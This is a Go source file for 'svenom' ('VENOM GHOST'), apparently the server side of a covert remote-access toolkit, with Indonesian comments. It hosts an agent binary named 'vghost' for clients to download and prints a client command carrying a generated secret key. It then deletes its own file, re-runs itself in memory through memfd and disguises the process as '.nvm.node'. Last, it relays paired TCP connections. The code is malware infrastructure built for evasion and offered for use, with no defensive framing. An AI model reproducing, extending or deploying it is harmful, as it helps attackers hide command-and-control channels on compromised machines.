package main

import (
	"bufio"
	"crypto/rand"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"

	"github.com/blackopsbos/svenom/pkg/masquerade"
	"github.com/blackopsbos/svenom/pkg/memfd"
)

var (
	installMode = flag.Bool("i", false, "Install relay server")
	domain      = flag.String("d", "", "Domain name (optional)")
	listenPort  = flag.String("port", "443", "Relay port")
	httpPort    = flag.String("http", "8080", "Port to serve agent binary")
)

const banner = `
██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗
██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║
██║   ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║
╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║
 ╚████╔╝ ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║
  ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝
`

func main() {
	flag.Parse()

	if !*installMode {
		fmt.Println(banner)
		fmt.Println("Usage: svenom -i [-d domain.com] [-port 443] [-http 8080]")
		return
	}

	publicIP, _ := getPublicIP()
	serverDomain := *domain
	if serverDomain == "" {
		serverDomain = publicIP
	}

	secretBytes := make([]byte, 16)
	rand.Read(secretBytes)
	secret := hex.EncodeToString(secretBytes)

	absPath, _ := filepath.Abs(".")

	// Baca file agent dari disk (harus ada di cmd/svenom/agentbin/vghost)
	agentPath := filepath.Join(absPath, "cmd/svenom/agentbin/vghost")
	agentBin, err := os.ReadFile(agentPath)
	if err != nil {
		log.Fatalf("Agent binary not found at %s: %v", agentPath, err)
	}

	// Spawn HTTP server untuk agent binary (background)
	go func() {
		http.HandleFunc("/vghost", func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("Content-Type", "application/octet-stream")
			w.Write(agentBin)
		})
		log.Printf("[*] Agent binary ready at http://%s:%s/vghost", serverDomain, *httpPort)
		http.ListenAndServe(fmt.Sprintf(":%s", *httpPort), nil)
	}()

	// Output instalasi bersih
	fmt.Println(banner)
	fmt.Println("(VENOM GHOST) ")
	fmt.Printf("IP Public Address Server : %s\n", publicIP)
	fmt.Printf("Domain Server            : %s\n", serverDomain)
	fmt.Printf("Path                     : %s\n", absPath)
	fmt.Printf("Secret Key               : %s\n", secret)
	fmt.Println()
	clientCmd := fmt.Sprintf("vghost --Sk %s -d %s", secret, serverDomain)
	fmt.Printf("Command Copy untuk Client > %s\n", clientCmd)
	fmt.Println("\n[*] Starting fileless relay server...")

	// Baca binary sendiri, hapus file, lalu exec fileless
	self, _ := os.ReadFile(os.Args[0])
	os.Remove(os.Args[0])

	args := []string{".nvm.node", "-relay", "-listen", fmt.Sprintf(":%s", *listenPort)}
	if err := memfd.ExecuteInMemory(self, args, os.Environ()); err != nil {
		log.Printf("memfd failed, fallback: %v", err)
		masquerade.DisguiseAs(".nvm.node", "/usr/bin/.nvm.node -relay -listen "+*listenPort)
		startRelayFallback(fmt.Sprintf(":%s", *listenPort))
	}
}

func getPublicIP() (string, error) {
	resp, err := http.Get("https://ifconfig.me/ip")
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	return string(body), nil
}

func startRelayFallback(addr string) {
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		log.Fatal(err)
	}
	log.Printf("Relay fallback listening on %s", addr)
	for {
		conn, _ := ln.Accept()
		go handleConn(conn)
	}
}

var waitingPeers = struct {
	sync.Mutex
	m map[string]net.Conn
}{m: make(map[string]net.Conn)}

func handleConn(conn net.Conn) {
	defer conn.Close()
	reader := bufio.NewReader(conn)
	secret, err := reader.ReadString('\n')
	if err != nil {
		return
	}
	secret = strings.TrimSpace(secret)

	waitingPeers.Lock()
	if peer, ok := waitingPeers.m[secret]; ok {
		delete(waitingPeers.m, secret)
		waitingPeers.Unlock()
		go io.Copy(peer, conn)
		io.Copy(conn, peer)
		peer.Close()
	} else {
		waitingPeers.m[secret] = conn
		waitingPeers.Unlock()
		defer func() {
			waitingPeers.Lock()
			delete(waitingPeers.m, secret)
			waitingPeers.Unlock()
		}()
		io.ReadAll(conn)
	}
}